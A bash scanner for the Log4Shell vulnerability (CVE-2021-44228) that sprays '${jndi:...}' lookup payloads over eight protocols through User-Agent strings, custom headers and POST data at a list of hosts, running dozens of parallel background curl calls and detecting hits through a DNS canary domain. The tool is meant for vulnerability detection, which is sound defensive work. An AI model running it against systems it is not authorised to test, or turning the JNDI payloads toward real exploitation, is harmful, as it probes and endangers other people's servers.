#!/bin/bash
# Author: Steve Stonebraker
# Date: 2021-12-16
# Usage: ./log4j-scan-turbo.sh <INPUT_FILE> <CANARY_DOMAIN>
# Purpose:
# This script will iterate through a list of IP Addresses/Domain Names and call
# each one using curl on http/https and send a payload that will notify a DNS canary domain
# (if the site is vulnerable to log4shell aka CVE-2021-44228)
#
# This scanner does 48 parallel curl with a connect timeout of 3 seconds and max time of six seconds
#

# shellcheck disable=SC3028 # $RANDOM variable is undefined.
# shellcheck disable=SC2148 # shebang does not exist. because this script will work both "zsh" and "bash".
# shellcheck disable=SC2162 #  will mangle backslashes. it does not important for now.
# shellcheck disable=SC2068,SC2128,SC2086,SC2124,SC2294,SC2145,SC2198 # TODO about $* $@
# shellcheck disable=SC2059 # printf wrapper warning.
# shellcheck disable=SC2155 # command may give error. variable assignment should be in another line.
# shellcheck disable=SC2016 # single vs double quotes
# shellcheck disable=SC1004 # line splitting is true. we need both linefeed+ empty spaces.
# shellcheck disable=SC2046 # all cases are valid. word splitting is not important in those cases. 
INPUTFILE=$1
CANARY_DOMAIN=$2
FILE_HEADERS="${PWD}/headers.txt"
USERAGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
hupdir="${PWD}/hupdir"
stamp=`date +"%d-%m-%y-%H-%M-%S"` # This is used to distinguish the scans
APEX_LOG_FILE="${PWD}/report/scan-$stamp.txt"
mkdir -p "${PWD}/report"
touch $APEX_LOG_FILE

if [ "$EUID" -ne 0 ]; then echo "Please run as with sudo or as root" && exit; fi
if [ "$#" -ne 2 ]; then echo "Usage: " && echo "sudo ./log4j-scan-turbo.sh <INPUT_FILE> <CANARY_DOMAIN>" && exit; fi
if [ ! -f "$INPUTFILE" ]; then echo "file [$INPUTFILE] does not exist!  Exiting... " && exit; fi
if [ ! -f "$FILE_HEADERS" ]; then echo "file [$FILE_HEADERS] does not exist!  Exiting... " && exit; fi

INPUTFILE_LENGTH=$(wc -l < ${INPUTFILE} | bc)
INPUTFILE_HAS_HTTP=$(egrep "http://|https" ${INPUTFILE} > /dev/null; echo $?)
if [ "$INPUTFILE_HAS_HTTP" = "0" ]; then echo "ERROR: Your input file must contain only IP addresses and/or fully qualified domain names" && echo "Please remove http:// and https:// from file $INPUTFILE" && exit; fi

echo "--------------------------------------------------------"
echo "Total Domains/IPs to scan: $INPUTFILE_LENGTH"
echo "Payload Protocols: 'ldap' 'ldaps' 'rmi' 'dns' 'corba' 'iiop' 'nis' 'nds'"
echo "Curl calls per protocol: 6 (HTTP Methods: GET/POST, TCP Ports 80/443, Payload in User Agent)"
echo "Total curl calls per domain: 48"
echo "--------------------------------------------------------"
echo "Payloads: "
PROTOCOLS=('ldap' 'ldaps' 'rmi' 'dns' 'corba' 'iiop' 'nis' 'nds')
for PROTOCOL in "${PROTOCOLS[@]}"
   do
      PAYLOAD_VALUE="\${jndi:${PROTOCOL}://${CANARY_DOMAIN}/a}"
      echo "$PAYLOAD_VALUE"
   done
echo "--------------------------------------------------------"
read -n 1 -s -r -p "Press any key to continue"

___stdout() {
   printf "%s" "$*" 
}

if [ -d "$hupdir" ]; then rm -Rf $hupdir; fi

mkdir -p "${hupdir}"

########################################
# Send User Agent Payload
__hup_curl_http_user_agent_payload() {
local -r local_USERAGENT=$1
local -r local_URL=$2
local -r local_APEX_LOG_FILE=$3
TMPFILE_NOEXT=$(mktemp "${hupdir}"/tmp.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX)
TMPFILE_LOG="$TMPFILE_NOEXT.sh.log"
mv "$TMPFILE_NOEXT" "${TMPFILE_NOEXT}.sh"
TMPFILE="${TMPFILE_NOEXT}.sh"
chmod 777 "$TMPFILE"

# Create File
   ___stdout '#!/bin/bash
URL="'"$local_URL"'"
TMPFILE_LOG="'"$TMPFILE_LOG"'"
local_APEX_LOG_FILE="'"$local_APEX_LOG_FILE"'"
local_USERAGENT="'"\\$local_USERAGENT"'"
currentscript="$0"
touch "${currentscript}.started"
# Function that is called when the script exits:
function finish {
touch "${currentscript}.ended"
local CURL_RETURN=$(cat $TMPFILE_LOG)
echo "$URL,$CURL_RETURN,$local_USERAGENT" >> "$local_APEX_LOG_FILE"
}   
curl --silent -L -o /dev/null --connect-timeout 3 --max-time 6 -w "%{scheme} %{remote_ip} %{http_code}" \
-A "'"${local_USERAGENT}"'" \
"'"${local_URL}"'";
trap finish EXIT
' >>"$TMPFILE"

# run File
   nohup "${TMPFILE}" > "${TMPFILE}".log 2>&1 & disown
}
# END FUNCTION
########################################

########################################
# Send HTTP Payload in url and with custom headers
__hup_curl_http_send_payload() {
local -r local_USERAGENT=$1
local -r local_URL=$2
local -r local_HEADER_PAYLOAD_VALUE=$3
local -r local_send_http_post=$4
local -r local_APEX_LOG_FILE=$5
CURRENT_HEADER_PAYLOAD_VALUE=$3
#echo "local_HEADER_PAYLOAD_VALUE ${local_HEADER_PAYLOAD_VALUE}"
TMPFILE_NOEXT=$(mktemp "${hupdir}"/tmp.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX)
TMPFILE_LOG="${TMPFILE_NOEXT}.sh.log"
mv "$TMPFILE_NOEXT" "${TMPFILE_NOEXT}.sh"
TMPFILE="${TMPFILE_NOEXT}.sh"
chmod 777 "$TMPFILE"

## WRITE CURL FOR HTTP POST
if [[ "$local_send_http_post" -eq 1 ]]; then
   ___stdout '#!/bin/bash
URL="'"$local_URL"'"
TMPFILE_LOG="'"$TMPFILE_LOG"'"
local_APEX_LOG_FILE="'"$local_APEX_LOG_FILE"'"
local_HEADER_PAYLOAD_VALUE="'"\\$CURRENT_HEADER_PAYLOAD_VALUE"'"
currentscript="$0"
touch "${currentscript}.started"
# Function that is called when the script exits:
function finish {
touch "${currentscript}.ended"
local CURL_RETURN=$(cat $TMPFILE_LOG)
echo "$URL,$CURL_RETURN,$local_HEADER_PAYLOAD_VALUE" >> "$local_APEX_LOG_FILE"
}   
curl --silent -L -o /dev/null --connect-timeout 3 --max-time 6 -w "%{scheme} %{remote_ip} %{http_code}" \
-A "'"${local_USERAGENT}"'" \
--data-urlencode "'"async=\\${local_HEADER_PAYLOAD_VALUE}"'" \
' >>"$TMPFILE"

## WRITE CURL FOR HTTP GET
elif [[ "$local_send_http_post" -eq 0 ]]; then
   ___stdout '#!/bin/bash
URL="'"$local_URL"'"
TMPFILE_LOG="'"$TMPFILE_LOG"'"
local_APEX_LOG_FILE="'"$local_APEX_LOG_FILE"'"
local_HEADER_PAYLOAD_VALUE="'"\\$local_HEADER_PAYLOAD_VALUE"'"
currentscript="$0"
touch "${currentscript}.started"
# Function that is called when the script exits:
function finish {
touch "${currentscript}.ended"
local CURL_RETURN=$(cat $TMPFILE_LOG)
echo "$URL,$CURL_RETURN,$local_HEADER_PAYLOAD_VALUE" >> "$local_APEX_LOG_FILE"
}
curl --silent -L -o /dev/null --connect-timeout 3 --max-time 6 -w "%{scheme} %{remote_ip} %{http_code}" \
-A "'"${local_USERAGENT}"'" \
' >>"$TMPFILE"
else
echo "Error, variable for local_send_http_post must be set to 0 or 1"
exit 1
fi
#start header loop
for record_HEADER in $(cat "${FILE_HEADERS}")
    do
      ___stdout '
 -H "'"${record_HEADER}: \\${local_HEADER_PAYLOAD_VALUE}"'"
      ' >>"$TMPFILE.headers"
   done
   ___stdout '\'  >>"$TMPFILE.headers" 
# end header loop
cat "$TMPFILE.headers" | tr -d '\n' >> "$TMPFILE"
#append url
___stdout '
"'"${local_URL}"'";

# When your script is finished, exit with a call to the function, "finish":
trap finish EXIT
' >>"$TMPFILE"
# END CREATE FILE
# clean up blank lines
grep -v "^$" "$TMPFILE" > "$TMPFILE.noblanks"
mv "$TMPFILE.noblanks" "$TMPFILE"
sudo chmod +x "$TMPFILE"
   nohup "${TMPFILE}" > "${TMPFILE}".log 2>&1 & disown
} 
# END FUNCTION
########################################

# Prints status during exeuction
__print_running_threads() {
   local current_record1=$1
   local current_count1=$2
    COUNT_STARTED_THREADS=$(find ${hupdir} -iname "*.started" 2>/dev/null | wc -l)
    COUNT_ENDED_THREADS=$(find ${hupdir} -iname "*.ended" 2>/dev/null | wc -l)
    printf "\r[Current Record: ${current_record1} ($current_count1 of $INPUTFILE_LENGTH)] - [Threads Started: $COUNT_STARTED_THREADS] - [Completed: $COUNT_ENDED_THREADS]"
}

# wait until curl thread count less than ten to continue
__print_curl_threads() {
    while : ; do
      COUNT_CURL=$(ps -ef | grep "curl" | wc -l)
      if [ "$COUNT_CURL" -gt 10 ]; then
         echo " [Threads still processing: $COUNT_CURL]"
         sleep 1
      else
         break
      fi
   done
}

# Executes curl commands against a record
process_protocols_headers () {
COUNT=0
local_record=$1
passed_count=$2
HTTP_URL="http://${local_record}"
HTTPS_URL="https://${local_record}"
SEND_HTTP_POST=1
SEND_HTTP_GET=0
PROTOCOLS=('ldap' 'ldaps' 'rmi' 'dns' 'corba' 'iiop' 'nis' 'nds')
for PROTOCOL in "${PROTOCOLS[@]}"
   do
      PAYLOAD_VALUE="\${jndi:${PROTOCOL}://${CANARY_DOMAIN}/a}"
      COUNT=$((COUNT+1))
      __hup_curl_http_user_agent_payload "$PAYLOAD_VALUE" "$HTTP_URL" "$APEX_LOG_FILE"
      __hup_curl_http_user_agent_payload "$PAYLOAD_VALUE" "$HTTPS_URL" "$APEX_LOG_FILE"
      __hup_curl_http_send_payload "$USERAGENT" "$HTTP_URL" "$PAYLOAD_VALUE" "$SEND_HTTP_GET" "$APEX_LOG_FILE"
      __hup_curl_http_send_payload "$USERAGENT" "$HTTPS_URL" "$PAYLOAD_VALUE" "$SEND_HTTP_GET" "$APEX_LOG_FILE"
      __hup_curl_http_send_payload "$USERAGENT" "$HTTP_URL" "$PAYLOAD_VALUE" "$SEND_HTTP_POST" "$APEX_LOG_FILE"
      __hup_curl_http_send_payload "$USERAGENT" "$HTTPS_URL" "$PAYLOAD_VALUE" "$SEND_HTTP_POST" "$APEX_LOG_FILE"
      __print_running_threads ${local_record} ${passed_count}
     
   done
   __print_curl_threads
}  

# process all records
RCOUNT=0
for record in $(cat "${INPUTFILE}")
do
   RCOUNT=$((RCOUNT+1))
   process_protocols_headers ${record} ${RCOUNT}
done

# cleanup log file and print location
sed -i 's| |,|g' "$APEX_LOG_FILE"
echo ""
echo "------------------------------------------------------------------------"
echo "All Domains/IPs have been called"
echo "Log file of HTTP response codes at:"
echo "$APEX_LOG_FILE"
echo "------------------------------------------------------------------------"
echo "Please note the response codes do not indicate that you are vulnerable"
echo "Your DNS token action will determine if you are vulnerable"
echo "------------------------------------------------------------------------"
